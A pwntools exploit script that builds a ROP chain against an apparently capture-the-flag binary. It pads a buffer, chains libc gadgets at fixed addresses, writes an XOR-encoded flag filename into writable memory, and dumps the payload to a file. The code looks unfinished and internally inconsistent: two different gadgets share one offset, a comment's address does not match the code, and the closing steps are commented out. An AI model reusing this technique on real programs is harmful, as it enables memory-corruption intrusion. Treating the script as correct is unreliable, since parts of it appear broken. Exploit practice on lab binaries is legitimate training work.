#!/bin/python

from pwn import *
import codecs

file = b"fl!'dtpt"

offset = 40
base = 0x00400000
libcBase = 0x7ffff7a19000
badcharLib = 0x7ffff7c00000

printFile = p64(badcharLib + 0x100a07);
writableAddress = p64(badcharLib + 0x00201060);

ret = p64(libcBase + 0x023206)

mov = p64(libcBase + 0xa2e10)
popRDI = p64(libcBase + 0x23835)
popRDXRBX = p64(libcBase + 0x82699)
xorAddtess = p64(libcBase + 0x000000000017ae66) #xor    BYTE PTR [rbp+0x21],cl
poprbp = p64(libcBase + 0x0000000000023730) #pop rbp; ret
poprcx = p64(libcBase + 0xd1dde)
popRAX = p64(libcBase + 0x258e4)
xor_rdi_dh = p64(base+0x400629)
xor_rax_cl = p64(libcBase+0x0000000000023730) # xor byte ptr [rax - 0x7d], cl; ret; RDX
xor_edi_rcx = p64(libcBase+0x12e1af) # xor edi, dword ptr [rcx]; ret 0x8e0f;
pop_rsi = p64(libcBase + 0x0000000000025151)
push_rdi = p64(libcBase + 0x026085)
mov_rsi_rdi = p64(libcBase + 0x122771)


rop = b"B"*offset

#This will write flag.txt into the address 0x601028
	
rop += popRDI
rop += writableAddress
rop += popRDXRBX
rop += file
rop += file
rop += mov
rop += poprcx
rop += writableAddress
rop += popRDI
rop += codecs.decode('0000404000000000', 'hex_codec')
rop += xor_edi_rcx
rop += pop_rsi
rop += writableAddress
rop += mov_rsi_rdi

#rop += popRDXRBX
#rop += codecs.decode('0070000000007000', 'hex_codec')
#rop += codecs.decode('0070000000007000', 'hex_codec')
#rop += xor_rdi_dh;

with open ('data', 'wb') as f:
	f.write(rop)

